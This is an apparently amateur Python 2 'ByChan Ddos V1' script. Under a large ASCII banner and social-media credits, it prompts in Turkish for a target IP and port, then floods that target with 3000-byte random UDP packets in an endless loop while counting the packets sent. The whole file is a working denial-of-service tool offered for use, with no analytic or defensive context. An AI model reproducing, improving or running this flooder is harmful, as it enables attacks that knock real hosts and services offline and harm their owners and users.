import socket
import random
import os

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

os.system("clear")
banner=bcolors.RED + """
     ...     ..                         ...                                                
  .=*8888x <"?88h.     ..            xH88"`~ .x8X      .uef^"                              
 X>  '8888H> '8888    @L           :8888   .f"8888Hf :d88E                      u.    u.   
'88h. `8888   8888   9888i   .dL  :8888>  X8L  ^""`  `888E             u      x@88k u@88c. 
'8888 '8888    "88>  `Y888k:*888. X8888  X888h        888E .z8k     us888u.  ^"8888""8888" 
 `888 '8888.xH888x.    888E  888I 88888  !88888.      888E~?888L .@88 "8888"   8888  888R  
   X" :88*~  `*8888>   888E  888I 88888   %88888      888E  888E 9888  9888    8888  888R  
 ~"   !"`      "888>   888E  888I 88888 '> `8888>     888E  888E 9888  9888    8888  888R  
  .H8888h.      ?88    888E  888I `8888L %  ?888   !  888E  888E 9888  9888    8888  888R  
 :"^"88888h.    '!    x888N><888'  `8888  `-*""   /   888E  888E 9888  9888   "*88*" 8888" 
 ^    "88888hx.+"      "88"  888     "888.      :"   m888N= 888> "888*""888"    ""   'Y"   
        ^"**""               88F       `""***~"`      `Y"   888   ^Y"   ^Y'                
                            98"                            J88"                            
                          ./"                              @%                              
                         ~`                              :"  
------------------------------------------------
- Bu Program ByChan Tarafindan Hazirlanmistir. -
-            ByChan Ddos V1                    -
-        Instagram: huseyinaltns               -
-            Youtube: ByChan                   -
------------------------------------------------

"""
print(banner)

hedef_ip=raw_input("Hedef Ip: ")
hedef_port=input("Hedef Port: ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
        sock.sendto(bytes,(hedef_ip,hedef_port))
        sayac=sayac+1
        print("Ddos Attack Basladi,Gonderilen Paket:%s"%(sayac))
        
